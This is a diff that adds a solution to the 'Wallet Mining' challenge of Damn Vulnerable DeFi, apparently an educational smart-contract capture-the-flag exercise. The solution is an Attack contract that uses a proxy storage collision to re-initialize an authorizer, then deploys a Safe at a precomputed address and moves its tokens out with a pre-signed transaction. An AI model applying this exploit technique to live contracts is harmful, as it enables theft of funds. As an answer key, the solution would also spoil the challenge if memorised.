@@ -8,6 +8,7 @@ import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contract
 import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {
     AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
 } from "../../src/wallet-mining/AuthorizerFactory.sol";
@@ -157,7 +158,90 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        // 1. Prepare Safe Initializer Data (Owners: [user], Threshold: 1)
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        bytes memory initializer = abi.encodeWithSelector(
+            Safe.setup.selector,
+            owners,
+            1,          // threshold
+            address(0), // to
+            "",         // data
+            address(0), // fallbackHandler
+            address(0), // paymentToken
+            0,          // payment
+            address(0)  // paymentReceiver
+        );
+
+        // 2. Prepare Data for Safe Execution (Transfer 20M DVT to user)
+        bytes memory transferData = abi.encodeWithSelector(
+            IERC20.transfer.selector,
+            user,
+            DEPOSIT_TOKEN_AMOUNT
+        );
+
+        // 3. Generate Signature for Safe Execution
+        bytes memory signature = _signSafeTransaction(
+            USER_DEPOSIT_ADDRESS,
+            address(token),
+            transferData,
+            userPrivateKey
+        );
+
+        // 4. Deploy Attack Contract (which performs the exploit in constructor)
+        new Attack(
+            address(authorizer),
+            address(walletDeployer),
+            address(token),
+            ward,
+            initializer,
+            13, // Nonce found
+            signature,
+            transferData
+        );
+    }
+
+    function _signSafeTransaction(
+        address safe,
+        address to,
+        bytes memory data,
+        uint256 privateKey
+    ) internal view returns (bytes memory) {
+        bytes32 safeTxHash = keccak256(
+            abi.encode(
+                0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8, // SAFE_TX_TYPEHASH
+                to,
+                0, // value
+                keccak256(data), // operation data
+                Enum.Operation.Call, // operation
+                0, // safeTxGas
+                0, // baseGas
+                0, // gasPrice
+                address(0), // gasToken
+                address(0), // refundReceiver
+                0 // nonce
+            )
+        );
+
+        bytes32 domainSeparator = keccak256(
+            abi.encode(
+                0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, // DOMAIN_SEPARATOR_TYPEHASH
+                block.chainid,
+                safe
+            )
+        );
+
+        bytes32 digest = keccak256(
+            abi.encodePacked(
+                bytes1(0x19),
+                bytes1(0x01),
+                domainSeparator,
+                safeTxHash
+            )
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);
+        return abi.encodePacked(r, s, v);
     }
 
     /**
@@ -188,5 +272,55 @@ contract WalletMiningChallenge is Test {
 
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+contract Attack {
+    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
+
+    constructor(
+        address _authorizer,
+        address _walletDeployer,
+        address _token,
+        address _ward,
+        bytes memory _initializer,
+        uint256 _saltNonce,
+        bytes memory _signature,
+        bytes memory _transferData
+    ) {
+        // 1. Authorize this contract via storage collision exploit
+        address[] memory wards = new address[](1);
+        wards[0] = address(this);
+        address[] memory aims = new address[](1);
+        aims[0] = USER_DEPOSIT_ADDRESS;
+        
+        AuthorizerUpgradeable(_authorizer).init(wards, aims);
+
+        // Verify authorization
+        require(AuthorizerUpgradeable(_authorizer).can(address(this), USER_DEPOSIT_ADDRESS), "Authorization failed");
+
+        // 2. Deploy Safe and claim reward
+        // This will deploy the Safe at USER_DEPOSIT_ADDRESS
+        bool success = WalletDeployer(_walletDeployer).drop(USER_DEPOSIT_ADDRESS, _initializer, _saltNonce);
+        require(success, "Drop failed");
+
+        // 3. Transfer the 1 DVT reward to ward
+        IERC20(_token).transfer(_ward, 1 ether);
+
+        // 4. Drain the Safe (transfer 20M DVT to user)
+        // We use the pre-signed transaction from the user
+        success = Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
+            _token, // to (Token Address)
+            0, // value
+            _transferData, // data (transfer call)
+            Enum.Operation.Call, // operation
+            0, // safeTxGas
+            0, // baseGas
+            0, // gasPrice
+            address(0), // gasToken
+            payable(address(0)), // refundReceiver
+            _signature
+        );
+        require(success, "Safe execution failed");
     }
 }
